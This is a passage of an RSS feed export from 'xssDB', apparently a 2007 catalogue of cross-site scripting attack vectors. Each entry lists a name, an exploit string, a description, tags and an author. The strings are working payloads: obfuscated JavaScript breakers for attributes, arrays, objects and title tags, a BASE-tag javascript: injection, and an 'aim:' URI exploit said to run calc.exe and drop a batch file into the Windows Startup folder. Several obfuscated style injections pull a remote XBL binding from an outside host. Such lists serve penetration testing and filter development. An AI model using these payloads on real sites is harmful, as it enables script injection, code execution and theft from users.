<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:ddb="http://dabbledb.com/schema">  <channel>    <title>xssDB</title>    <link>http://xssdb.dabbledb.com/publish/attackdb/dc23ad51-25ef-4fdc-92be-4a7cb606387e/xssdb.html</link>    <description></description>    <item>      <title>Add onclick event hadler</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1822</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Add onclick event hadler&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated, user interaction&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.</ddb:exploitDescription>      <ddb:exploitName>Add onclick event hadler</ddb:exploitName>      <ddb:exploitString>onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated, user interaction</ddb:exploitTags>    </item>    <item>      <title>Advanced HTML injection locator</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1837</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Advanced HTML injection locator&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;s&gt;000&lt;s&gt;%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&amp;#60&amp;#115&amp;#62&amp;#51&amp;#51&amp;#51&amp;#60&amp;#47&amp;#115&amp;#62&amp;#x3c&amp;#x73&amp;#x3e&amp;#x34&amp;#x34&amp;#x34&amp;#x3c&amp;#x2f&amp;#x73&amp;#x3e&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector indicates HTML injections by stroked text.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector indicates HTML injections by stroked text.</ddb:exploitDescription>      <ddb:exploitName>Advanced HTML injection locator</ddb:exploitName>      <ddb:exploitString>&lt;s&gt;000&lt;s&gt;%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&amp;#60&amp;#115&amp;#62&amp;#51&amp;#51&amp;#51&amp;#60&amp;#47&amp;#115&amp;#62&amp;#x3c&amp;#x73&amp;#x3e&amp;#x34&amp;#x34&amp;#x34&amp;#x3c&amp;#x2f&amp;#x73&amp;#x3e</ddb:exploitString>      <ddb:exploitTags>general, html breaking, injection</ddb:exploitTags>    </item>    <item>      <title>Advanced XSS Locator</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1856</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Advanced XSS Locator&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;';alert(0)//\';alert(1)//&quot;;alert(2)//\&quot;;alert(3)//--&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(4)&lt;/SCRIPT&gt;=&amp;{}&quot;);}alert(6);function xss(){//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Advanced XSS Locator&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, comment breaking, JS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Advanced XSS Locator</ddb:exploitDescription>      <ddb:exploitName>Advanced XSS Locator</ddb:exploitName>      <ddb:exploitString>';alert(0)//\';alert(1)//&quot;;alert(2)//\&quot;;alert(3)//--&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(4)&lt;/SCRIPT&gt;=&amp;{}&quot;);}alert(6);function xss(){//</ddb:exploitString>      <ddb:exploitTags>general, html breaking, comment breaking, JS breaking</ddb:exploitTags>    </item>    <item>      <title>Advanced XSS Locator for title-Injections</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1839</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Advanced XSS Locator for title-Injections&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;';alert(0)//\';alert(1)//&quot;;alert(2)//\&quot;;alert(3)//--&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;/title&gt;&lt;SCRIPT&gt;alert(4)&lt;/SCRIPT&gt;=&amp;{&lt;/title&gt;&lt;script&gt;alert(5)&lt;/script&gt;}&quot;);}&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, comment breaking, JS breaking, title breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 15:27:05 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.</ddb:exploitDescription>      <ddb:exploitName>Advanced XSS Locator for title-Injections</ddb:exploitName>      <ddb:exploitString>';alert(0)//\';alert(1)//&quot;;alert(2)//\&quot;;alert(3)//--&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;/title&gt;&lt;SCRIPT&gt;alert(4)&lt;/SCRIPT&gt;=&amp;{&lt;/title&gt;&lt;script&gt;alert(5)&lt;/script&gt;}&quot;);}</ddb:exploitString>      <ddb:exploitTags>general, html breaking, comment breaking, JS breaking, title breaking</ddb:exploitTags>    </item>    <item>      <title>aim: uri exploit</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2016</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;aim: uri exploit&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;aim: &amp;c:\windows\system32\calc.exe&quot; ini=&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat&quot;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This aim-uri executes the calc.exe on vulnerable systems&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;URI exploits, gecko, injection, general&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;xs-sniper</description>      <pubDate>Tue, 24 Jul 07 10:37:37 -0400</pubDate>      <ddb:authorName>xs-sniper</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This aim-uri executes the calc.exe on vulnerable systems</ddb:exploitDescription>      <ddb:exploitName>aim: uri exploit</ddb:exploitName>      <ddb:exploitString>aim: &amp;c:\windows\system32\calc.exe&quot; ini=&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat&quot;</ddb:exploitString>      <ddb:exploitTags>URI exploits, gecko, injection, general</ddb:exploitTags>    </item>    <item>      <title>Backslash-obfuscated XBL injection - variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=13237</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Backslash-obfuscated XBL injection - variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Mon, 26 Nov 07 08:47:50 -0500</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.</ddb:exploitDescription>      <ddb:exploitName>Backslash-obfuscated XBL injection - variant 1</ddb:exploitName>      <ddb:exploitString>&lt;div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Backslash-obfuscated XBL injection - variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=13255</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Backslash-obfuscated XBL injection - variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;div/style=&amp;#92&amp;#45&amp;#92&amp;#109&amp;#111&amp;#92&amp;#122&amp;#92&amp;#45&amp;&lt;br&gt;#98&amp;#92&amp;#105&amp;#92&amp;#110&amp;#100&amp;#92&amp;#105&amp;#110&amp;#92&amp;#103:&amp;&lt;br&gt;#92&amp;#117&amp;#114&amp;#108&amp;#40&amp;#47&amp;#47&amp;#98&amp;#117&amp;#115&amp;#105&amp;&lt;br&gt;#110&amp;#101&amp;#115&amp;#115&amp;#92&amp;#105&amp;#92&amp;#110&amp;#102&amp;#111&amp;#46&amp;&lt;br&gt;#99&amp;#111&amp;#46&amp;#117&amp;#107&amp;#92&amp;#47&amp;#108&amp;#97&amp;#98&amp;#115&lt;br&gt;&amp;#92&amp;#47&amp;#120&amp;#98&amp;#108&amp;#92&amp;#47&amp;#120&amp;#98&amp;#108&amp;#92&lt;br&gt;&amp;#46&amp;#120&amp;#109&amp;#108&amp;#92&amp;#35&amp;#120&amp;#115&amp;#115&amp;#41&amp;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Mon, 26 Nov 07 08:43:00 -0500</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.</ddb:exploitDescription>      <ddb:exploitName>Backslash-obfuscated XBL injection - variant 2</ddb:exploitName>      <ddb:exploitString>&lt;div/style=&amp;#92&amp;#45&amp;#92&amp;#109&amp;#111&amp;#92&amp;#122&amp;#92&amp;#45&amp;&#13;&#10;#98&amp;#92&amp;#105&amp;#92&amp;#110&amp;#100&amp;#92&amp;#105&amp;#110&amp;#92&amp;#103:&amp;&#13;&#10;#92&amp;#117&amp;#114&amp;#108&amp;#40&amp;#47&amp;#47&amp;#98&amp;#117&amp;#115&amp;#105&amp;&#13;&#10;#110&amp;#101&amp;#115&amp;#115&amp;#92&amp;#105&amp;#92&amp;#110&amp;#102&amp;#111&amp;#46&amp;&#13;&#10;#99&amp;#111&amp;#46&amp;#117&amp;#107&amp;#92&amp;#47&amp;#108&amp;#97&amp;#98&amp;#115&#13;&#10;&amp;#92&amp;#47&amp;#120&amp;#98&amp;#108&amp;#92&amp;#47&amp;#120&amp;#98&amp;#108&amp;#92&#13;&#10;&amp;#46&amp;#120&amp;#109&amp;#108&amp;#92&amp;#35&amp;#120&amp;#115&amp;#115&amp;#41&amp;&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Backslash-obfuscated XBL injection - variant 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=13264</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Backslash-obfuscated XBL injection - variant 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;Q%^&amp;*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Mon, 26 Nov 07 08:44:13 -0500</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.</ddb:exploitDescription>      <ddb:exploitName>Backslash-obfuscated XBL injection - variant 3</ddb:exploitName>      <ddb:exploitString>&lt;Q%^&amp;*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Backslash-obfuscated XBL injection - variant 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=13273</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Backslash-obfuscated XBL injection - variant 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;div&amp;nbsp &amp;nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Mon, 26 Nov 07 08:45:09 -0500</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.</ddb:exploitDescription>      <ddb:exploitName>Backslash-obfuscated XBL injection - variant 4</ddb:exploitName>      <ddb:exploitString>&lt;div&amp;nbsp &amp;nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Backslash-obfuscated XBL injection - variant 5</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=13282</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Backslash-obfuscated XBL injection - variant 5&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Between any character of the original payload null bytes are used to obfuscate.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Mon, 26 Nov 07 08:47:36 -0500</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Between any character of the original payload null bytes are used to obfuscate.</ddb:exploitDescription>      <ddb:exploitName>Backslash-obfuscated XBL injection - variant 5</ddb:exploitName>      <ddb:exploitString>&lt;x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL, obfuscated</ddb:exploitTags>    </item>    <item>      <title>BASE</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1870</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;BASE&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:02:23 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work</ddb:exploitDescription>      <ddb:exploitName>BASE</ddb:exploitName>      <ddb:exploitString>&lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Basic back ticked attribute breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1824</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic back ticked attribute breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;`&gt; &lt;script&gt;alert(5)&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks back ticked attributes.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks back ticked attributes.</ddb:exploitDescription>      <ddb:exploitName>Basic back ticked attribute breaker</ddb:exploitName>      <ddb:exploitString>`&gt; &lt;script&gt;alert(5)&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking, basic</ddb:exploitTags>    </item>    <item>      <title>Basic double quoted attribute breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1825</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic double quoted attribute breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&gt; &lt;script&gt;alert(4)&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks double quoted attributes and produces an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 10:08:50 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks double quoted attributes and produces an alert.</ddb:exploitDescription>      <ddb:exploitName>Basic double quoted attribute breaker</ddb:exploitName>      <ddb:exploitString>&gt; &lt;script&gt;alert(4)&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1823</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;xyz onerror=alert(6); &lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector just fits between script tags and fires an alerts.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector just fits between script tags and fires an alerts.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker</ddb:exploitName>      <ddb:exploitString>xyz onerror=alert(6); </ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1818</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;1;a=eval;b=alert;a(b(/c/.source));&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks JS integer assignments.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks JS integer assignments.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 1</ddb:exploitName>      <ddb:exploitString>1;a=eval;b=alert;a(b(/c/.source));</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1817</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;1];a=eval;b=alert;a(b(17));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks JS integer assignments in arrays.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks JS integer assignments in arrays.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 2</ddb:exploitName>      <ddb:exploitString>1];a=eval;b=alert;a(b(17));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1816</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;];a=eval;b=alert;a(b(16));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks JS when placed in double quoted arrays.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 10:09:44 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks JS when placed in double quoted arrays.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 3</ddb:exploitName>      <ddb:exploitString>];a=eval;b=alert;a(b(16));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1815</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;'];a=eval;b=alert;a(b(15));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks JS when embedded in single quoted arrays.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks JS when embedded in single quoted arrays.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 4</ddb:exploitName>      <ddb:exploitString>'];a=eval;b=alert;a(b(15));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 5</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1814</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 5&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;1};a=eval;b=alert;a(b(14));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;JS literal object breaker for integer properties.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>JS literal object breaker for integer properties.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 5</ddb:exploitName>      <ddb:exploitString>1};a=eval;b=alert;a(b(14));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 6</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1813</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 6&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;'};a=eval;b=alert;a(b(13));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;JS breaker for literal objects with single quoted string properties.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>JS breaker for literal objects with single quoted string properties.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 6</ddb:exploitName>      <ddb:exploitString>'};a=eval;b=alert;a(b(13));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 7</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1812</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 7&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;};a=eval;b=alert;a(b(12));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;JS breaker for literal objects with double quoted string properties.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 10:10:41 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>JS breaker for literal objects with double quoted string properties.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 7</ddb:exploitName>      